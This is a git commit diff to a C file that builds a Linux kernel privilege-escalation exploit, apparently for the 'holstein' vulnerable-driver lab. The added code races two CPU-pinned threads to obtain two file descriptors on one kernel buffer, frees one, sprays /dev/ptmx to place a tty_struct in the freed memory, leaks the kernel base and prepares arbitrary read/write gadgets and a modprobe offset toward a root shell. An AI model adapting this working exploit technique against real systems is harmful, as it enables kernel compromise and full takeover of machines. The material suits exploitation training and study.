7fb1a6fb03a0afa4824ec21fe3dd852349c6134d
hunsang <hoonsang99@korea.ac.kr>
2024-12-06 19:59:52 +0900

    full

--- ex.c
+++ ex.c
@@ -1,9 +1,12 @@
+#define _GNU_SOURCE             /* See feature_test_macros(7) */
+#include <sched.h>
 #include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <stdint.h>
+#include <pthread.h>
 #include <sys/prctl.h>
 #ifndef HEXDUMP_COLS
 #define HEXDUMP_COLS 16
@@ -67,7 +70,9 @@ void hexdump(void *mem, unsigned int len)
 #define AAR_GADGET 0xffffffff816ae679 - 0xffffffff81000000
 #define AAW_GADGET 0xffffffff818d9ef8 - 0xffffffff81000000
 
-int fd1, fd2;
+int fd1 = 3;
+int fd2 = 4;
+int race_win = 0;
 int target_fd;
 char buf[0x500];
 uint64_t kernel_base;
@@ -89,6 +94,56 @@ unsigned int AAR(uint64_t* src){
 	return ioctl(target_fd, 0, src);
 }
 
+void race(cpu_set_t* cpu){
+	//pin cpu 
+	sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu);
+	
+
+	while(1){
+		//race
+		while(!race_win){
+				int fd = open("/dev/holstein", O_RDWR);
+				if(fd == fd2) race_win = 1;
+				if((fd != -1 && !race_win) || fd == -1) close(fd);
+		}
+		
+		//write test
+		if(write(fd1, "A", 1) != 1 || write(fd2, "A", 1) != 1){
+			close(fd1);
+			close(fd2);
+			race_win = 0;
+		}
+		else{
+			printf("[+] win race!\n");
+			break;
+		}
+	}
+
+	usleep(1000);
+}
+
+int spray(cpu_set_t* cpu){
+	//pin cpu 
+	sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu);
+	uint16_t x;
+	int spray[800];
+	for(int i=0; i< 800; i++){
+		spray[i] = open( "/dev/ptmx" , O_RDONLY | O_NOCTTY);
+		if(spray[i] == -1){
+			for(int j=0; j < i; j++){
+				close(spray[j]);
+			}
+		}
+		if(read(fd2, &x, 2) && x == 0x5401){
+			for(int j=0; j < i; j++){
+				close(spray[j]);
+			}
+			return spray[i];
+		}
+	}
+	return -1;
+}
+
 void win(){
     system("/dummy");
     system("/shell");
@@ -97,13 +152,48 @@ void win(){
 #define kernel_offset 0x0000000001072460
 #define modprobe  0x0000000001451020
 int main() {
+	pthread_t th1, th2;
 
-	fd1 = open("/dev/holstein", O_RDWR);
-	fd2 = open("/dev/holstein", O_RDWR);
+	cpu_set_t cpu0, cpu1;
+	CPU_ZERO(&cpu0);
+	CPU_ZERO(&cpu1);
+	CPU_SET(0, &cpu0);
+	CPU_SET(1, &cpu1);
+
+	pthread_create(&th1, NULL, race, &cpu0);
+	pthread_create(&th2, NULL, race, &cpu1);
+	pthread_join(th1, NULL);
+	pthread_join(th2, NULL);
+
+	//test
+	write(fd1, "hello", 5);
+	read(fd2, buf, 5);
+	hexdump(buf, 5);
+
+	printf("[-] free(fd1) and fd2 still has controle of holstein!\n");
+	printf("[?] But... which cpu freed the kernel heap??\n");
 	close(fd1);
-	target_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+	memset(buf, 0, 0x500);
+	write(fd2, buf, 0x10);
+
+	target_fd = -1;
+	//spray to cpu0
+	pthread_create(&th1, NULL, spray, &cpu0);
+	pthread_join(th1, &target_fd);
+	
+	if(target_fd == -1){
+		pthread_create(&th1, NULL, spray, &cpu1);
+		pthread_join(th1, &target_fd);
+		if(target_fd == -1){
+			printf("[-]bad...\n");
+			exit(0);
+		}
+	}
+	printf("[-] target fd is %d\n", target_fd);
+	printf("[!] now we can controle tty struct!\n");
 	read(fd2, buf, 0x400);
-	hexdump(buf,0x400);
+	hexdump(buf, 0x400);
+
 	kernel_base = *(uint64_t*)(buf + 0x18) - kernel_offset;
 	printf("[-] kernel base: %p\n", kernel_base);
 	gbuf_addr = *(uint64_t*)(buf + 0x38) - (uint64_t)0x38;
